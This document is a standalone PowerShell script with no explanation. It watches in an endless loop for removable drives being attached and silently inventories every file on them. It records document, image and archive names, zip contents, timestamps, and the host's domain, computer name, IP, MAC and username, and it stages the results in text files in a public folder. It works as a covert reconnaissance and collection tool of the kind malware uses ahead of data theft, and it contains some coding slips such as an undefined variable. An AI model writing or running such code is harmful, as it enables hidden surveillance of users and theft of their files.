$sw = [System.Diagnostics.Stopwatch]::startnew()
$drive = ((Get-PSDrive -PSProvider FileSystem | Where-Object name -ne "C" | select root).root).count
do {
if (((Get-PSDrive -PSProvider FileSystem | Where-Object name -ne "C" | select root).root).count -ne $drive)
{
[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
$ErrorActionPreference = 'silentlycontinue'
$IP = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.netadapter.status -ne "Disconnected"}).ipv4address.ipaddress
$MAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"}).MacAddress
$aroot = (get-psdrive -PSProvider FileSystem |Where-Object name -ne "C" | select root).root
foreach ($root in $aroot)
{
$dir = Get-ChildItem $root -file -recurse
$rootn = $root.split(":")[0]
$docc = ($dir -like "*.doc").count
$doc = ($dir -like "*.doc")
foreach ($docf in $doc)
{
$doce = "."+($docf.split(".")[-1])
$docf + ":::;" + $doce + ":::;" +$docc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$hwpc = ($dir -like "*.hwp").count
$hwp = ($dir -like "*.hwp")
foreach ($hwpf in $hwp)
{
$hwpe = "."+($hwpf.split(".")[-1])
$hwpf + ":::;" + $hwpe + ":::;" +$hwpc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$pdfc = ($dir -like "*.pdf").count
$pdf = ($dir -like "*.pdf")
foreach ($pdff in $pdf)
{
$pdfe = "."+($pdff.split(".")[-1])
$pdff + ":::;" + $pdfe + ":::;" +$pdfc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$xlsc = ($dir -like "*.xls").count
$xls = ($dir -like "*.xls")
foreach ($xlsf in $xls)
{
$xlse = "."+($xlsf.split(".")[-1])
$xlsf + ":::;" + $xlse + ":::;" +$xlsc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$csvc = ($dir -like "*.csv").count
$csv = ($dir -like "*.csv")
foreach ($csvf in $csv)
{
$csve = "."+($csvf.split(".")[-1])
$csvf + ":::;" + $csve + ":::;" +$csvc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$pngc = ($dir -like "*.png").count
$png = ($dir -like "*.png")
foreach ($pngf in $png)
{
$pnge = "."+($pngf.split(".")[-1])
$pngf + ":::;" + $pnge + ":::;" +$pngc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$jpc = ($dir -like "*.jp*").count
$jp = ($dir -like "*.jp*")
foreach ($jpf in $jp)
{
$jpe = "."+($jpf.split(".")[-1])
$jpf + ":::;" + $jpe + ":::;" +$jpc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$zc = ($dir -like "*.*zip").count
$z = ($dir -like "*.*zip")
foreach ($zf in $z)
{
$ze = "."+($zf.split(".")[-1])
$zf + ":::;" + $ze + ":::;" +$zc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$7zc = ($dir -like "*.7z").count
$7z = ($dir -like "*.7z")
foreach ($7zf in $7z)
{
$7ze = "."+($7zf.split(".")[-1])
$7zf + ":::;" + $7ze + ":::;" +$7zc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$noec = ($dir | Where-Object {$_.extension -eq ""}).count
$noe = ($dir | Where-Object {$_.extension -eq ""} | select Name).name
foreach ($noef in $noe)
{
$noef + ":::;" + ":::;" +$noec | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$splitc = ($dir -like "*.0??").count
$split = ($dir -like "*.0??")
foreach ($splitf in $split)
{
$splite = "."+($splitf.split(".")[-1])
$splitf + ":::;" + $splite + ":::;" +$splitc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$splitc2 = ($dir -like "*._").count
$split2 = ($dir -like "*._")
foreach ($split2f in $split2)
{
$split2e = "."+($split2f.split(".")[-1])
$split2f + ":::;" + $split2e + ":::;" +$splitc2 | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$txtc = ($dir -like "*tx*").count
$txt = ($dir -like "*.tx*")
foreach ($txtf in $txt)
{
$txte = "."+($txtf.split(".")[-1])
$txtf + ":::;" + $txte + ":::;" +$txtc | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmm)_${rootn}_quicks.txt -Append -encoding utf8
}
$sw.Elapsed.tostring('dd\.hh\"mm\:ss\.fff')
foreach ($file in $dir)
{
$rootd = ($file.directoryname.Split(":"))[0]
$cdatetime = ($file | select CreationTime).CreationTime
$cdatetime = get-date $cdatetime -format yyyy-MM-dd@HH:mm:ss
$cdate = $cdatetime.split("@")[0]
$ctime = $cdatetime.split("@")[1]
$adatetime = ($file | select LastAccessTime).LastAccessTime
$adatetime = get-date $adatetime -format yyyy-MM-dd@HH:mm:ss
$adate = $cdatetime.split("@")[0]
$atime = $cdatetime.split("@")[1]
$mdatetime = ($file | select LastWriteTime).LastWriteTime
$mdatetime = get-date $mdatetime -format yyyy-MM-dd@HH:mm:ss
$mdate = $mdatetime.split("@")[0]
$mtime = $mdatetime.split("@")[1]
$env:userdomain + ":::;" + $env:COMPUTERNAME + ":::;" + $IP + ":::;" + $MAC + ":::;" + $env:username + ":::;" +  $cdate + ":::;" + $ctime + “ :“ + $adate + ":::;" + $atime + “ :“ + $mdate + “ :“ + $mtime + “ :“ + "{0:N2}" -f ($file.length/1kb) + ":::;" + $rootd + ":::;" + $file.directoryname + ":::;" + $file.name + ":::;" + $file.basename + ":::;" + $file.extension + ":::;" + $file.attributes | Out-File C:\Users\Public\Documents\${MAC}_$(get-date -f yyyyMMddHH)_${rood}_files.txt -Append -Encoding utf8
if ($file -like "*.zip")
{
[IO.Compression.ZipFile]::OpenRead($file.FullName).Entries | %{$env:userdomain+ ":::;" + $env:COMPUTERNAME + ":::;" + $IP + ":::;" + $MAC + ":::;" + $env:username + ":::;" +  $cdate + ":::;" + $ctime + “ :“ + $adate + ":::;" + $atime + “ :“ + $mdate + “ :“ + $mtime + “ :“ + "{0:N2}" -f ($file.Length/1kb) + ":::;" + $rootd + ":::;" + $file.DirectoryName + ":::;" + $file.Name + ":::;" + $file.BaseName + ":::;" + $file.Extension + ":::;" + $file.Attributes+ ":::;" + "$($_.FullName):::;$($_.fullname.split(".")[-1]):::;$($_.Length/1kb)" } | Out-File  C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHH)_${rood}_zip.txt -Append 
}
}
}
$sw.stop()
$sw.Elapsed.tostring('dd\.hh\"mm\:ss\.fff')
$drive = ((Get-PSDrive -PSProvider FileSystem | Where-Object name -ne "C" | select root).root).count
}
sleep 1
((Get-PSDrive -PSProvider FileSystem | Where-Object name -ne "C" | select root).root).count
}

While ($true)
